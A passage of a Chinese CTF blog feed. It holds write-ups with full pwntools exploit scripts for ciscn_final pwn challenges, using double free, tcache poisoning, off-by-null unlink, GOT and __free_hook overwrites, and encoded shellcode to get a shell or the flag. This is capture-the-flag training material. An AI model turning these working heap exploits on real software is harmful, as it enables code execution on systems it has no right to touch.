done</span><br><span class="line">    120 &#x3D;&#x3D;&gt; simply write something on the stack (no use at all)</span><br><span class="line">    238 &#x3D;&#x3D;&gt; first input after &quot;string: &quot; : index</span><br><span class="line">            free the chunk that recently malloc (pointer will not be reset to 0, </span><br><span class="line">            thus bring double free)</span><br><span class="line">    386 &#x3D;&#x3D;&gt; simply exit</span><br><span class="line"></span><br><span class="line">some global variable:</span><br><span class="line">    0x605AC0 &#x3D;&#x3D;&gt; store the address of the chunk_array </span><br><span class="line">    0x604940 &#x3D;&#x3D;&gt; store the address of the present chunk</span><br><span class="line">    0x6040E0 &#x3D;&#x3D;&gt; store the times that &quot;free&quot; can be used (initialize to 4), if use up,</span><br><span class="line">                 the process will print out the chunk_array and simply exit</span><br><span class="line"></span><br><span class="line">some constraints:</span><br><span class="line">    chunk size should satisfy &quot;size &gt; 0 &amp;&amp; size &lt;&#x3D; 0x7F&quot;</span><br><span class="line">    can only malloc at most 10 chunks (according to the free space in chunk_array)</span><br><span class="line">    for &quot;238&quot;(free) function, index should satisfy &quot;index &gt;&#x3D; 0 &amp;&amp; index &lt;&#x3D; 9&quot;</span><br><span class="line">    &quot;238&quot;(free) function can only be used 4 times (according to the value stored in 0x6040E0)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">offset &#x3D; 0x21b97</span><br><span class="line">system_offset &#x3D; libc.symbols[&quot;system&quot;]</span><br><span class="line">atoi_got &#x3D; elf.got[&quot;atoi&quot;]</span><br><span class="line">printf_plt &#x3D; elf.plt[&#39;printf&#39;]</span><br><span class="line">bss &#x3D; elf.bss(0x1500)</span><br><span class="line">chunk_array_addr &#x3D; 0x605AC0</span><br><span class="line">delete_times_addr &#x3D; 0x6040e0</span><br><span class="line"></span><br><span class="line"># double free</span><br><span class="line">new(0x28, &#39;AAAA&#39;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">new(0x38, &#39;BBBB&#39;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line"># set the delete time to 0xAAA</span><br><span class="line">new(0x28, p64(delete_times_addr)) </span><br><span class="line">new(0x28, &#39;AAAA&#39;) </span><br><span class="line">new(0x28, p64(0xAAA))</span><br><span class="line"></span><br><span class="line"># reset the chunk_array</span><br><span class="line">new(0x38, p64(chunk_array_addr)) </span><br><span class="line">new(0x38, &#39;AAAA&#39;) </span><br><span class="line">new(0x38, p64(bss))</span><br><span class="line"></span><br><span class="line"># double free</span><br><span class="line">new(0x48, &quot;CCCC&quot;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">new(0x58, &quot;DDDD&quot;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line"># write aoti_got to printf_plt</span><br><span class="line">new(0x48, p64(atoi_got)) </span><br><span class="line">new(0x48, &#39;AAAA&#39;) </span><br><span class="line">new(0x48, p64(printf_plt)) </span><br><span class="line"></span><br><span class="line"># leak libc</span><br><span class="line">p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;%25$p&quot;)</span><br><span class="line">p.recvline()</span><br><span class="line">libc_addr &#x3D; int(p.recv(14)[2:], 16)</span><br><span class="line">libc_base &#x3D; libc_addr - offset</span><br><span class="line">libc_system &#x3D; libc_base + system_offset</span><br><span class="line"></span><br><span class="line"># write atoi_got to system</span><br><span class="line">new(0x58, p64(atoi_got), True)</span><br><span class="line">new(0x58, &quot;DDDD&quot;, True)</span><br><span class="line">new(0x58, p64(libc_system), True)</span><br><span class="line"></span><br><span class="line"># system(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line">p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">success(&quot;libc_base: &quot; + hex(libc_base))</span><br><span class="line">success(&quot;libc_system: &quot; + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="ciscn-final-8"><a href="#ciscn-final-8" class="headerlink" title="ciscn_final_8"></a>ciscn_final_8</h1><h2 id="前言-7"><a href="#前言-7" class="headerlink" title="前言"></a>前言</h2><p>乍一看好像挺复杂的，其实仔细看看逻辑挺简单的（但是我还是花了蛮久时间的，太菜了）。</p><h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><ol><li>在<code>login</code>之后，输入<code>text</code>的长度是可控的而且没有限制，故存在溢出。</li><li>在<code>register</code>一个<code>user</code>的时候，会先对输入的<code>password</code>进行SM3散列计算再储存，然后在输入完<code>text</code>之后，对所有的元数据（包括<code>user</code>的名字，<code>password length</code>，<code>password</code>散列，<code>text_len</code>，<code>text</code>）再进行一次SM3散列计算并储存。</li><li>之后的每次<code>login</code>都会对这两个散列进行检查。</li><li>利用<code>user0</code>的溢出将<code>user1</code>特定的<code>password</code>散列leak出来（比如”0”)。</li><li>利用leak出来的<code>password</code>散列，伪造<code>user2</code>用户输入的<code>password</code>为<code>admin2</code>所有元数据（包括名字<code>admin2</code>，<code>password length</code>（1），<code>password</code>散列（之前leak出来的”0”的散列），<code>text_len</code>，<code>text</code>），该元数据的散列值将会被储存在<code>user2</code>的区域。</li><li>利用<code>user1</code>的溢出leak出上述提到的<code>admin2</code>的所有元数据的散列。</li><li>再次利用<code>user1</code>的溢出覆盖<code>user2</code>为伪造的superuser也就是<code>admin2</code>。</li><li>以<code>user2</code>的身份<code>login</code>，此时便能通过superuser也就是<code>admin2</code>的check条件，达到调用<code>getflag</code>功能的目的。</li></ol><h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(age, passwd_len, passwd, content_len, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"please set your age:"</span>, str(age))</span><br><span class="line">    p.sendlineafter(<span class="string">"first, length of passwd?"</span>, str(passwd_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your passwd"</span>, str(passwd))</span><br><span class="line">    p.sendlineafter(<span class="string">"first, length of text?"</span>, str(content_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your text"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(id, passwd_len, passwd)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"first, input your id"</span>, str(id))</span><br><span class="line">    p.sendlineafter(<span class="string">"length of passwd?"</span>, str(passwd_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your passwd"</span>, str(passwd))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">whoami</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_content</span><span class="params">(content_len, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"first, length of text?"</span>, str(content_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your text"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># register two user</span></span><br><span class="line">register(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"0"</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line">register(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"0"</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak the SM3 of the password</span></span><br><span class="line">login(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line">set_content(<span class="number">0x70</span>, <span class="string">'A'</span> * <span class="number">0x6C</span> + <span class="string">"SM3:"</span>)</span><br><span class="line">whoami()</span><br><span class="line">p.recvuntil(<span class="string">"SM3:"</span>)</span><br><span class="line">digest = p.recvline()</span><br><span class="line"><span class="keyword">assert</span>(len(digest) == <span class="number">0x22</span> <span class="keyword">and</span> digest[<span class="number">-2</span>] == <span class="string">'0'</span>)</span><br><span class="line">digest = digest[:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># restore the second user</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x40</span> + <span class="string">'\x00'</span> * <span class="number">0x4</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>) + p32(<span class="number">1</span>) + <span class="string">"user1"</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x70</span>, <span class="string">"\x00"</span>)</span><br><span class="line">set_content(<span class="number">0x70</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># test the second user</span></span><br><span class="line"><span class="comment"># quit()</span></span><br><span class="line"><span class="comment"># login(1, 1, "0")</span></span><br><span class="line"><span class="comment"># quit()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reigster the third user</span></span><br><span class="line">password = p64(<span class="number">2</span>) + p32(<span class="number">1</span>) + <span class="string">"admin"</span></span><br><span class="line">password += <span class="string">"2"</span></span><br><span class="line">password = password.ljust(<span class="number">0x24</span>, <span class="string">"\x00"</span>)</span><br><span class="line">password += digest</span><br><span class="line">password += <span class="string">"0"</span></span><br><span class="line">password = password.ljust(<span class="number">0x64</span>, <span class="string">"\x00"</span>)</span><br><span class="line">register(<span class="number">0</span>, <span class="number">0x64</span>, password, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak the SM3 of the password</span></span><br><span class="line">login(<span class="number">1</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line">set_content(<span class="number">0x70</span>, <span class="string">'A'</span> * <span class="number">0x6C</span> + <span class="string">"SM3:"</span>)</span><br><span class="line">whoami()</span><br><span class="line">p.recvuntil(<span class="string">"SM3:"</span>)</span><br><span class="line">digest = p.recvline()</span><br><span class="line"><span class="keyword">assert</span>(len(digest) == <span class="number">0x22</span> <span class="keyword">and</span> digest[<span class="number">-2</span>] == <span class="string">'0'</span>)</span><br><span class="line">digest = digest[:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake the third user as admin</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x4C</span></span><br><span class="line">payload += password</span><br><span class="line">payload += digest</span><br><span class="line">set_content(<span class="number">0x84</span> + <span class="number">0x4C</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># login as admin</span></span><br><span class="line">quit()</span><br><span class="line">login(<span class="number">2</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># getflag</span></span><br><span class="line">getflag()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-9"><a href="#ciscn-final-9" class="headerlink" title="ciscn_final_9"></a>ciscn_final_9</h1><h2 id="前言-8"><a href="#前言-8" class="headerlink" title="前言"></a>前言</h2><p>明显的off by null，通过unlink形成chunk overlap，因为看错了<code>if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))</code>判断条件一度怀疑人生（甚至怀疑以前怎么做unlink的）。</p><h2 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h2><ol><li>分配所有10个chunk，将后面的7个chunk释放并填满tcache bin。</li><li>剩下的三个chunk通过off by null形成chunk overlap，需要满足相应的<code>fd</code>，<code>bk</code>，<code>prev_size</code>字段。</li><li>由于”\x00\x02”(<code>prev_size=0x200</code>)无法直接写进去，这里需要连续释放剩下的3个chunk，使得第三个chunk的<code>prev_size</code>会被写入<code>0x200</code>。</li><li>将所有10个chunk又全部从bin中分配出来。</li><li>释放除了3个上述提到的unsorted bin之外的7个chunk中的6个，以填充6个tcache bin的位置。</li><li>将3个unsorted bin中位于中间位置的chunk释放到tcache bin中，从而下一次分配就能分配到该chunk，将size设置为<code>0x78</code>从而覆盖第三个unsorted bin的<code>prev_inuse</code>标志位为0。</li><li>再次将tcache bin重新填满，释放第一个unsorted bin，满足<code>fd</code>和<code>bk</code>的约束。</li><li>此时再次释放第三个unsorted bin，此时触发unlink，获得0x300的unsorted bin，第二个unsorted bin被overlap，从而可以被二次分配。</li><li>之后就利用tcache double free，写<code>__free_hook</code>为onegadget，触发<code>free</code>来getshell。</li></ol><h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size \n&gt; "</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"content \n&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index \n&gt; "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index \n&gt; "</span>, str(index))</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x10a38c</span></span><br><span class="line">one_gadget_offset = <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc 10 chunks</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    new(<span class="number">4</span>, <span class="string">"AAAA\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fill tcache bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc 10 chunks</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># put chunk 7 into unsorted bin</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"CCCC\n"</span>) <span class="comment"># leave one tacache bin for chunk 8</span></span><br><span class="line">delete(<span class="number">8</span>) <span class="comment"># put chunk 8 into tcache bin</span></span><br><span class="line">new(<span class="number">0xF8</span>, <span class="string">"DDDD\n"</span>) <span class="comment"># off by null to chunk 9</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># fill tcache bin</span></span><br><span class="line">delete(<span class="number">9</span>) <span class="comment"># unlink</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># take all tcache bin out</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    new(<span class="number">0xF0</span>, <span class="string">"EEEE\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"FFFF\n"</span>) <span class="comment"># chunk 8</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - <span class="number">0x60</span> - main_arena_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache double free</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"GGGG\n"</span>) <span class="comment"># chunk 9</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># prepare enough space</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">new(<span class="number">0xF0</span>, p64(__free_hook)) <span class="comment"># chunk 0</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"/bin/sh\x00"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">new(<span class="number">0xF0</span>, p64(one_gadget)) <span class="comment"># chunk 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-10"><a href="#ciscn-final-10" class="headerlink" title="ciscn_final_10"></a>ciscn_final_10</h1><h2 id="前言-9"><a href="#前言-9" class="headerlink" title="前言"></a>前言</h2><p>这个应该巨简单了，根本没难点。</p><h2 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h2><ol><li>首先要通过check才能进行后续操作，随机数肯定是才不到的，后续只要输入一个低2 bytes为0的负数就能通过check了。</li><li>后面就是明显的tcache double free。</li><li>通过partial write tcache bin，分配到储存<code>The cake is not a lie!</code>的chunk，将其改写为<code>The cake is a lie!</code>。</li><li>之后输入一个无效选项（比如3）触发后续接受输入，在对该输入进行简单的异或操作后当作指令执行的功能。</li><li>对shellcode进行对应的处理之后作为输入，然后就能getshell了。</li></ol><h2 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">access</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"-65536"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"-65536"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_shellcode</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    shellcode = [ord(item) <span class="keyword">for</span> item <span class="keyword">in</span> shellcode][::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            payload += chr(shellcode[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += chr(ord(payload[i - <span class="number">1</span>]) ^ shellcode[i])</span><br><span class="line">    <span class="keyword">return</span> payload[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get access right</span></span><br><span class="line">access()</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"><span class="comment"># change str</span></span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"\x90"</span>)</span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"The cake is a lie!\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send shellcode</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">p.sendafter(<span class="string">"&gt; "</span>, gen_shellcode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwnable.tw做不动了，发现BUUOJ上的题目挺多的，加上想刷一刷2019国赛的题目，这两天断断续续地做了几道题目，简单记录一下。&lt;br&gt;&lt;br&gt;&lt;b&gt;更新：10道刷完，有些题目还是挺有意思的。&lt;/b&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn fsb: printable</title>
    <link href="https://n0nop.github.io/2020/04/21/pwn-fsb-printable/"/>
    <id>https://n0nop.github.io/2020/04/21/pwn-fsb-printable/</id>
    <published>2020-04-21T03:25:00.000Z</published>
    <updated>2020-04-21T04:56:15.317Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="1e93152e178c4c2fd3a5c949942d6dcc0068751df8ec56693f52d3cf98cba8cd"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HFCTF pwn: SecureBox</title>
    <link href="https://n0nop.github.io/2020/04/20/HFCTF-pwn-SecureBox/"/>
    <id>https://n0nop.github.io/2020/04/20/HFCTF-pwn-SecureBox/</id>
    <published>2020-04-20T10:51:20.000Z</published>
    <updated>2020-05-12T15:21:13.097Z</updated>
    
